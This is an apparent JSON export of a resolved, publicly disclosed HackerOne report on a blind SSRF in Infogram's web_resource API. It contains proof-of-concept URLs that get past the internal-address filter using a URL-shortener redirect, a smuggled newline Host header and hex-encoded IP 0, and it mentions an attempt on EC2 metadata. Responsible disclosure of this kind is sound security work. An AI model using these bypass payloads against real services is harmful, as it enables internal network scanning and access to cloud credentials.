{"id":287496,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODc0OTY=","url":"https://hackerone.com/reports/287496","title":"Internal Ports Scanning via Blind SSRF  (URL Redirection to beat filter)","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-11-05T03:11:25.056Z","submitted_at":"2017-11-05T03:11:25.056Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"spicyturtle","url":"/spicyturtle","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21745,"url":"https://hackerone.com/infogram","handle":"infogram","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Infogram","twitter_handle":"infogram","website":"http://infogram.com","about":"Make Infographics and Charts that People Love"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-08T14:14:33.919Z","bug_reporter_agreed_on_going_public_at":"2017-11-07T21:45:13.618Z","team_member_agreed_on_going_public_at":"2017-11-08T14:14:33.802Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Summary\n---------------------\nThis is a blind SSRF that lets you scan internal ports.\n\nTechnical Details\n--------------------\nInspired by #281950, I found a way to evade the filter for the api endpoint `web_resource` by using a URL Redirection service.  I used tinyurl to create a url that linked to http://0:6000/ (any port would work here).    \n\nProof of Concept\n----------\nhttps://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg\n\nResponse:\n```\nHTTP/1.1 200 OK\nDate: Sun, 05 Nov 2017 02:42:03 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nServer: nginx\nVary: Accept-Encoding\nX-DNS-Prefetch-Control: off\nStrict-Transport-Security: max-age=31536000\nX-Download-Options: noopen\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: no-referrer\nX-Frame-Options: SAMEORIGIN\nETag: W/\"fd-LAmakEWFfBZbQhSwn4nbeuTsy48\"\nX-Infogram-Server: b201\nX-Infogram-Proxy: us\nContent-Length: 253\n\n[{\"title\":\"Create Infographics, Charts and Maps - Infogram\",\"description\":\"Infogram is an easy to use infographic and chart maker. Create and share beautiful infographics, online charts and interactive maps. Make your own here.\",\"url\":\"http://0:6000/\"}]\n```\n\nI'm not sure if that tinyurl sticks around, but it's trivial to make another one using the information above.\n\nMitigation\n--------------\nAlter your filter so that it follows redirects until it lands on an actual URL, then check that URL.\n","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\n\u003cp\u003eThis is a blind SSRF that lets you scan internal ports.\u003c/p\u003e\n\n\u003ch2 id=\"technical-details\"\u003eTechnical Details\u003c/h2\u003e\n\n\u003cp\u003eInspired by \u003ca href=\"/reports/281950\"\u003e#281950\u003c/a\u003e, I found a way to evade the filter for the api endpoint \u003ccode\u003eweb_resource\u003c/code\u003e by using a URL Redirection service.  I used tinyurl to create a url that linked to \u003ca title=\"http://0:6000/\" href=\"/redirect?url=http%3A%2F%2F0%3A6000%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://0:6000/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (any port would work here).    \u003c/p\u003e\n\n\u003ch2 id=\"proof-of-concept\"\u003eProof of Concept\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg\" href=\"/redirect?url=https%3A%2F%2Finfogram.com%2Fapi%2Fweb_resource%2Furl%3Fq%3Dhttps%3A%2F%2Ftinyurl.com%2Fybk7sqrg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nDate: Sun, 05 Nov 2017 02:42:03 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nServer: nginx\nVary: Accept-Encoding\nX-DNS-Prefetch-Control: off\nStrict-Transport-Security: max-age=31536000\nX-Download-Options: noopen\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: no-referrer\nX-Frame-Options: SAMEORIGIN\nETag: W/\u0026quot;fd-LAmakEWFfBZbQhSwn4nbeuTsy48\u0026quot;\nX-Infogram-Server: b201\nX-Infogram-Proxy: us\nContent-Length: 253\n\n[{\u0026quot;title\u0026quot;:\u0026quot;Create Infographics, Charts and Maps - Infogram\u0026quot;,\u0026quot;description\u0026quot;:\u0026quot;Infogram is an easy to use infographic and chart maker. Create and share beautiful infographics, online charts and interactive maps. Make your own here.\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;http://0:6000/\u0026quot;}]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;m not sure if that tinyurl sticks around, but it\u0026#39;s trivial to make another one using the information above.\u003c/p\u003e\n\n\u003ch2 id=\"mitigation\"\u003eMitigation\u003c/h2\u003e\n\n\u003cp\u003eAlter your filter so that it follows redirects until it lands on an actual URL, then check that URL.\u003c/p\u003e\n","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-12-07T21:45:13.749Z","allow_singular_disclosure_after":-96536349.17225355,"singular_disclosure_allowed":true,"vote_count":8,"voters":["sp1d3rs","eveeez","khizer47","alfredsaonoy","cr4xerbik4sh","sa1tama0","spicyturtle","b4155f7c29acd42c27d007a"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":870,"asset_type":"URL","asset_identifier":"infogram.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2136377,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-06T09:02:38.164Z","updated_at":"2017-11-06T09:02:38.164Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2141219,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks, it should be fixed now.\n\nBest regards,\nKaspars","markdown_message":"\u003cp\u003eThanks, it should be fixed now.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nKaspars\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-07T19:44:15.313Z","updated_at":"2017-11-07T19:44:15.313Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"spicyturtle","url":"/spicyturtle"},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2141485,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Awesome, I\"ve confirmed that the fix works.  Can we disclose publicly?","markdown_message":"\u003cp\u003eAwesome, I\u0026quot;ve confirmed that the fix works.  Can we disclose publicly?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-07T21:45:13.680Z","updated_at":"2017-11-07T21:45:13.680Z","first_to_agree":true,"actor":{"username":"spicyturtle","cleared":false,"url":"/spicyturtle","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2142179,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, I've actually come up with a few bypasses. \nhttps://infogram.com/api/web_resource/url?q=\\nHost:localhost \nThis one gives me a 500 but the actual response still contains the same information.\n\nhttps://infogram.com/api/web_resource/url?q=http://0x0:6000\nThis is just a different way of encoding IP address 0.  There's a tonn of different ways of encoding 0 - http://www.pc-help.org/obscure.htm is a good place to look.\n\nTo mitigate these, you may need to augment your filter by actually letting the URL resolve first, then checking it.  I tried to use this technique to reach your ec2 metadata, but that appears to be locked up tight - you may want to reference whatever you're using to filter for that.","markdown_message":"\u003cp\u003eHey, I\u0026#39;ve actually come up with a few bypasses. \u003cbr\u003e\n\u003ca title=\"https://infogram.com/api/web_resource/url?q=/nHost:localhost\" href=\"/redirect?url=https%3A%2F%2Finfogram.com%2Fapi%2Fweb_resource%2Furl%3Fq%3D%2FnHost%3Alocalhost\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://infogram.com/api/web_resource/url?q=/nHost:localhost\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003cbr\u003e\nThis one gives me a 500 but the actual response still contains the same information.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://infogram.com/api/web_resource/url?q=http://0x0:6000\" href=\"/redirect?url=https%3A%2F%2Finfogram.com%2Fapi%2Fweb_resource%2Furl%3Fq%3Dhttp%3A%2F%2F0x0%3A6000\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://infogram.com/api/web_resource/url?q=http://0x0:6000\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nThis is just a different way of encoding IP address 0.  There\u0026#39;s a tonn of different ways of encoding 0 - \u003ca title=\"http://www.pc-help.org/obscure.htm\" href=\"/redirect?url=http%3A%2F%2Fwww.pc-help.org%2Fobscure.htm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.pc-help.org/obscure.htm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is a good place to look.\u003c/p\u003e\n\n\u003cp\u003eTo mitigate these, you may need to augment your filter by actually letting the URL resolve first, then checking it.  I tried to use this technique to reach your ec2 metadata, but that appears to be locked up tight - you may want to reference whatever you\u0026#39;re using to filter for that.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-08T07:11:17.351Z","updated_at":"2017-11-08T07:11:17.351Z","actor":{"username":"spicyturtle","cleared":false,"url":"/spicyturtle","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2142974,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the provided workarounds! It should be fixed now.\nKaspars","markdown_message":"\u003cp\u003eThanks for the provided workarounds! It should be fixed now.\u003cbr\u003e\nKaspars\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-08T14:14:24.256Z","updated_at":"2017-11-08T14:14:24.256Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2142975,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-08T14:14:33.862Z","updated_at":"2017-11-08T14:14:33.862Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2142976,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-08T14:14:33.948Z","updated_at":"2017-11-08T14:14:33.948Z","actor":{"username":"kaspars","cleared":false,"url":"/kaspars","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"infogram","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}